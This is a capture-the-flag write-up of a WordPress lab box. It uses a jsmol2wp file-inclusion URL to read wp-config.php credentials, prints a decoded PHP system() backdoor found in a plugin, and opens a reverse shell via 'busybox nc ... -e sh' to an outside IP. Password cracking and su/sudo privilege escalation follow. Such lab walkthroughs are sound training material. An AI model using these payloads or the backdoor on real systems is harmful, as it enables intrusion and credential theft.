# Smol

### Smol
Nmap scan shows ports 22 and 80 open. On port 80 I get redirected to `www.smol.thm`. So I add it to the `/etc/hosts` file. This is a wordpress website. 
I launched `wpscan --url http://www.smol.thm --enumerate p,t,u` to enumerate it, and found a plugin called jsmol2wp:<br />
![image](https://github.com/user-attachments/assets/49ed7392-5d04-48e1-b9db-aa415951ae48)<br />
Searching online I discover that this version is vulnerable to file inclusion ([link](https://github.com/sullo/advisory-archives/blob/master/wordpress-jsmol2wp-CVE-2018-20463-CVE-2018-20462.txt))<br />
To exploit this vulnerability, just visit `http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php` to read the config file. This file contains database configurations, including credentials: <br />
![image](https://github.com/user-attachments/assets/8eaf5f70-e3b2-406a-8c56-c8886ebd84f9)<br />
I'm now logged in as wpuser, which has not admin privileges. Looking around the panel, I found a private post from the admin: <br />
![image](https://github.com/user-attachments/assets/22ed1f9f-d781-4008-8a6c-f2272d9639d3)<br />
Since I don't have admin access, I can't directly access the plugin from the dashboard. But I can use the LFI vulnerability to read it!
I need to know the exact name of the plugin. I found[ this repository](https://github.com/WordPress/hello-dolly) in which it is called `hello.php`. So if I visit `http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/hello.php`<br />
I get the actual source code of the plugin!<br />
![image](https://github.com/user-attachments/assets/b34393ee-887e-4c36-84c8-42150f4780b5)<br />
Can you see the difference? There's an `eval` function inside the plugin that's not in the original source code. This is the decoded string: ` if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); } `.
This function gets executed when `admin_notices`, meaning when someone visits the control panel, which is when the plugin hello-dolly is executed. To run this backdoor, I just visit `http://www.smol.thm/wp-admin/?cmd=whoami`:<br />
![image](https://github.com/user-attachments/assets/7b276c05-0699-43d1-b998-7045860f0568)<br />
And I have RCE! I now spawn a reverse shell with `http://www.smol.thm/wp-admin/?cmd=busybo nc 10.11.85.53 9001 -e sh`. <br />
Now it's time to privesc. There are the following users: <br />
![image](https://github.com/user-attachments/assets/5e1b1abd-8003-4028-a0d0-11ff4dcf9e67)<br />
I run `mysql -u wpuser -p` and prompt the password found inside the config file. Inside the wordpress database, there are the hashes for the users!<br />
![image](https://github.com/user-attachments/assets/c0c15a8f-f1a7-4e19-a0d0-4a8b7e5f530e)<br />
So I copy all these hashes inside a file called `hashes.txt` and then run `john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt`. I took me a while, about 5/10 minutes, but john was able to crack diego's password!<br />
I use that password to switch to diego's account with `su diego`. After retrieving the userflag, I located a private ssh key inside the home directory of the user `think`. I used it to log into the account. Next, there's a file called `wordpress.old.zip` inside `gege`'s home directory. But I don't have access to it. However gege has no password, so if I try to run `su gege` I can get in just like that.<br />
Now I can access the .zip file, but if I try to unzip it, I get asked for a password. So I trasnfer the .zip file using netcat on my machine and then try to bruteforce the password with `zip2john wordpress.old.zip > hash.txt` and then `john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`:<br />
![image](https://github.com/user-attachments/assets/afe60118-95a1-4717-90da-4f4618e3a4e8)<br />
So I unzip the file and read the `wp-config.php` file inside of it: <br />
![image](https://github.com/user-attachments/assets/d4121c54-71ad-434f-8c7d-482efc8e66b8)<br />
I use that password to log into xavi account with `su xavi`. Now if I run `sudo -l`, I get: <br />
![image](https://github.com/user-attachments/assets/49a6c683-fe28-4875-96e9-ab504b5ffeef)<br />
So just run `sudo su` and become root!<br /><br />

Before closing, I really want to know why the user think could access gege's account without password... If I try that for example with the user `diego`, get asked for a password. I had to get an hint from an external write up because I was stuck for a while after becoming `think`. But I really didn't understand this configuration.. So after becoming root, looking at the `/etc/sudoers`:<br />
![image](https://github.com/user-attachments/assets/c78b8d3f-7745-43ff-91d9-250f9b7bc139)<br />
There is no particular configuration that specifies those kind of privileges for the user `think`. However, if I go look at `/etc/pam.d/su`, this is what I get: <br />
![image](https://github.com/user-attachments/assets/a5d9a34f-dd41-495a-a478-2391156ec1e0)<br />
So I did some research: PAM(Pluggable Authentication Modules) is a suite of libraries that allows system administrators to set authentication policies without having to recompile programs that handle authentication. This file `/etc/pam.d/su` controls how the su command behaves. <br />
I can't really understand the specifics of the configuration and I don't have time to dig too much. But at least I've learned that sometimes a user can have a very specific privilege to access another user without password, and that `/etc/pam` contains authentication configuration for programs.
